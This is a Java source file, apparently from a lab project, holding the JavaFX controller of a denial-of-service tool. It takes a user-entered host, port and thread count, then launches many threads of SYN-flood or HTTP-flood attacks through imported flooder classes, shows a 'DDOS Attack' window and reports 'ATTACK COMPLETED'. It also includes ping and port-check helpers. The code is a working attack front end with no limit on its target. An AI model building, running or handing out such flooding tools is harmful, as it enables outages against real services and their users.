/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package fxml.pkg1;

import java.io.*;
import java.net.*;
import java.net.URL;
import java.time.format.DateTimeFormatter;
import java.time.LocalDateTime;    
import java.util.ResourceBundle;

import FOIS_LAB.HTTPFlooder;
import FOIS_LAB.SYNFlooder;
import javafx.event.ActionEvent;
import java.net.MalformedURLException;
import java.net.URLConnection;
import java.util.logging.Level;
import java.util.logging.Logger;
import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.fxml.FXMLLoader;
import javafx.fxml.Initializable;
import javafx.scene.Scene;
import javafx.scene.control.Alert;
import javafx.scene.control.Alert.AlertType;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ProgressBar;
import javafx.scene.control.RadioButton;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.control.ToggleGroup;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;
import javafx.stage.StageStyle;
import static javax.swing.JOptionPane.showMessageDialog;

/**
 *
 * @author Henok_Gelaneh
 */
public class MainAppFXMLController implements Initializable {
    HTTPFlooder fdr;
    SYNFlooder sdr;
    @FXML
    private TextField hostname;
    
    @FXML
    private AnchorPane borderpane;
    
    public TextField port;
    
    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");  
    LocalDateTime now = LocalDateTime.now();  
    
    public TextArea output;
    @FXML
    private RadioButton synflood;
    @FXML
    private ToggleGroup tggrp1;
    @FXML
    private RadioButton httpflood;
    @FXML
    private Button pingbtn;
    @FXML
    private Button portchk;
    @FXML
    private Button intchk;
    @FXML
    private Button attack;
    @FXML
    private ProgressBar progress;
    @FXML
    private Label percent;
    @FXML
    private TextField threads;
    
    Alert a = new Alert(AlertType.NONE);
    
    @FXML
    public void ping(ActionEvent event) throws IOException {
        boolean bol = checkInt();
        if (bol){
            if (hostname.getText().isEmpty()){
                a.setAlertType(AlertType.WARNING);
                a.setContentText("Please Enter Hostname/IP");
                a.show();
                //showMessageDialog(null, "Please Enter Hostname/Ip!");
            }else{
                String str = sendPingRequest(hostname.getText());
                output.appendText("["+dtf.format(now)+"]"+ str+'\n');
            }
        } else{
            output.appendText("["+dtf.format(now)+"]"+ "Internet Connection not found"+'\n');
        }
        
    }
    @FXML
    public void checkPort(ActionEvent event) throws IOException {
        boolean bol = checkInt();
        if (bol){
            if (port.getText().isEmpty()){
                //showMessageDialog(null, "Please Enter Port!");
                a.setAlertType(AlertType.WARNING);
                a.setContentText("Please Enter Port!");
                a.show();
            }else if(hostname.getText().isEmpty()){
                //showMessageDialog(null, "Please Enter Hostname/Ip!");
                a.setAlertType(AlertType.WARNING);
                a.setContentText("Please Enter Hostname/IP");
                a.show();
            }
            else{
                String str2 =checkPortAv(Integer.parseInt(port.getText()));
                output.appendText("["+dtf.format(now)+"]"+ str2+'\n');
//            output.appendText("["+dtf.format(now)+"]"+ str+'\n');
            }
        } else{
            output.appendText("["+dtf.format(now)+"]"+ "Internet Connection Not Found!"+'\n');
        }
        
    }
    @FXML
    public void checkInternet(ActionEvent event) throws IOException {
        String str3 = checkInternet();
        output.appendText("["+dtf.format(now)+"]"+ str3+'\n');
    }
    @FXML
    public void startattack(ActionEvent event) throws IOException, InterruptedException {
        boolean bol = checkInt();
        if (bol){
            if (hostname.getText().isEmpty()){
                a.setAlertType(AlertType.WARNING);
                a.setContentText("Please Enter Hostname/IP");
                a.show();
            }else if(port.getText().isEmpty()){
                a.setAlertType(AlertType.WARNING);
                a.setContentText("Please Enter Port");
                a.show();
            }else if(threads.getText().isEmpty()){
                a.setAlertType(AlertType.WARNING);
                a.setContentText("Please Enter Number of Threads");
                a.show();
            }
            else{
                if (intChecker(port.getText())&&intChecker(threads.getText())){
                    if (synflood.isSelected()){
                        output.appendText("["+dtf.format(now)+"]"+ "Starting SYN flood Attack..."+'\n');
                        gifloader();
                        makeProgress();
                        new Thread(()-> {

                            try {
                                flooder2Thread();
                            } catch (IOException e) {
                                e.printStackTrace();
                            }
                        }).start();

                        
                    } else {
                        output.appendText("["+dtf.format(now)+"]"+ "Starting HTTP flood Attack..."+'\n');
//                        gifloader();
//                        makeProgress();
                        new Thread(()-> {
                            try {
                                flooderThread();
                            } catch (IOException | InterruptedException e) {
                                e.printStackTrace();
                            }
                        }).start();


                    }
                }else{
                    showMessageDialog(null, "Please Enter An Integer Number");
                }
                
            }
            
        }
        else{
            output.appendText("["+dtf.format(now)+"]"+ "Internet Connection not found"+'\n');
        }
        
        
    }
    
    @Override
    public void initialize(URL url, ResourceBundle rb) {
        progress.setVisible(false);
        output.setStyle("-fx-control-inner-background: #404040; -fx-text-fill:lightgreen;");
    }   

    public String sendPingRequest(String ipAddress) throws UnknownHostException, IOException {
        InetAddress geek = InetAddress.getByName(ipAddress);
        System.out.println("Sending Ping Request to " + ipAddress);
        if (geek.isReachable(5000)){
            System.out.println("Host is reachable");
            return "Host is reachable";
        }
        else{
            System.out.println("We can't reach this host");
            return "Host is unreachable";
        }
    }
    
    public boolean intChecker(String string){
        try {
            Integer intValue = Integer.parseInt(string);
            return true;
        } catch (NumberFormatException e) {
            System.out.println("Please enter an interger number.");
            return false;
        }
        
    }
    
    public String checkPortAv(int port) throws IOException{
        Socket Skt;
        String host = hostname.getText();
        try{
            System.out.println("Looking for "+ port);
            Skt = new Socket(host,port);
            System.out.println("There is a server on port " + port + " of " + host);
            return "Port "+port+" is open on "+host;
        } catch(ConnectException e){
            System.out.println("There is no server on port " + port + " of " + host);
            return "Port "+port+" is not open on "+host;
        } catch(UnknownHostException e){
            System.out.println("There is no server on port " + port + " of " + host);
            return "Port "+port+" is not open on "+host;
        }
    }
    
    public String checkInternet() throws IOException{
        try {
            URL url = new URL("http://www.google.com");
            URLConnection connection = url.openConnection();
            connection.connect();
            System.out.println("Internet is connected");
            return "Internet is connected";
        } catch (MalformedURLException e) {
            System.out.println("Internet is not connected");
            return "Internet is not connected";
        } catch (IOException e) {
            System.out.println("Internet is not connected");
            return "Internet is not connected";
        }
    }
    
    public boolean checkInt() throws IOException{
        try {
            URL url = new URL("http://www.google.com");
            URLConnection connection = url.openConnection();
            connection.connect();
            System.out.println("Internet is connected");
            return true;
        } catch (MalformedURLException e) {
            System.out.println("Internet is not connected");
            return false;
        } catch (IOException e) {
            System.out.println("Internet is not connected");
            return false;
        }
    }
    
    public void makeProgress(){
        progress.setVisible(true);
        new Thread(()->{
            for(int i=0;i<=100;i++){
            
                final int prg = i;
                Platform.runLater(()->{
                    progress.setProgress(prg/100.0);
                });
                Platform.runLater(new Runnable() {
                    @Override
                    public void run() {
                        if(prg==100){
                            Stage stage = (Stage) borderpane.getScene().getWindow();
                            stage.hide();
                            a.setAlertType(AlertType.INFORMATION);
                            a.setContentText("ATTACK COMPLETED");
                            a.show();
                        }
                    }
                });
                try{
//                    Thread.sleep(100);
                }catch(Exception e){
                    
                }
            }
        }).start();
    }
    
    private void gifloader(){
        new Thread(){
            public void run(){
                try{
//                    Thread.sleep(3000);
                }catch(Exception e){
                    System.out.println(e);
                }
                Platform.runLater(new Runnable(){
                    public void run(){
                        try {
                            borderpane = FXMLLoader.load(getClass().getResource("CodeMatrixFXML.fxml"));
                            Stage stage = new Stage();
                            Scene scene = new Scene(borderpane);
                            stage.setTitle("DDOS Attack");
                            stage.setResizable(false);
                            stage.initStyle(StageStyle.UNDECORATED);
                            stage.setScene(scene);
                            stage.setMinHeight(400);
                            stage.setMinWidth(600);
                            stage.show();
                        } catch (IOException ex) {
                            Logger.getLogger(SplashScreenController.class.getName()).log(Level.SEVERE, null, ex);
                        }
                    }
                });
            }
        }.start();
    }
    
    private void closeWn(){
        try {
            borderpane = FXMLLoader.load(getClass().getResource("CodeMatrixFXML.fxml"));
            Stage stage = new Stage();
            Scene scene = new Scene(borderpane);
            
            //borderpane.getScene().getWindow().hide();
        } catch (IOException ex) {
            Logger.getLogger(SplashScreenController.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public void flooderThread() throws IOException, InterruptedException {
        for (int i = 0; i < Integer.parseInt(threads.getText()); i++){
            fdr = new HTTPFlooder(hostname.getText(), port.getText(), "tasks/api_create");
            fdr.jsonFlood();
            fdr.start();
            if(fdr.getConn().getResponseMessage()!=null) output.appendText("Thread "+fdr.getName()+" "+fdr.getConn(). getResponseCode()+ " "+fdr.getConn().getResponseMessage()+"\n");

        }
    }
    public void flooder2Thread() throws IOException{
        for (int i = 0; i < Integer.parseInt(threads.getText()); i++){
            sdr = new SYNFlooder(hostname.getText(),Integer.parseInt(port.getText()));
            sdr.start();
            output.appendText("Thread "+i+" "+sdr.getSocket().isConnected()+ " "+sdr.getSocket().getInetAddress()+"\n");
        }
    }
}
